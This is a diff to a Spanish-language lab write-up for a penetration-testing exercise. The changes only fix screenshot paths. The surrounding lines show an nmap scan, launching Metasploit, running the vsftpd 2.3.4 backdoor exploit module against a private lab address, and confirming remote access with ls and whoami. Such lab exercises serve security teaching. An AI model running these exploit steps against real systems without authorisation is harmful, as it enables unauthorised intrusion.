@@ -79,7 +79,7 @@ nmap -F 192.168.X.X
 
 msfconsole
 
-![metasploit](metasploit.png)
+![metasploit](img/metasploit.png) 
 
 ## 🟦 4.2 Seleccionar y ejecutar el exploit vsftpd 2.3.4
 
@@ -87,7 +87,7 @@ use exploit/unix/ftp/vsftpd_234_backdoor
 set RHOSTS 192.168.56.X
 run
 
-![Ejecución del exploit](run.png)
+![Ejecución del exploit](<img/run metasploit.png>)
 
 ---
 
@@ -106,9 +106,9 @@ ls
 
 Esta es la captura final obligatoria donde se ve que hemos accedido al sistema remoto.
 
-![Sistema remoto](<ls metasploit.png>)
+![Sistema remoto](<img/ls metasploit.png>)
 
-![whoami](whoami.png)
+![whoami](img/whoami.png)
 
 
 ---
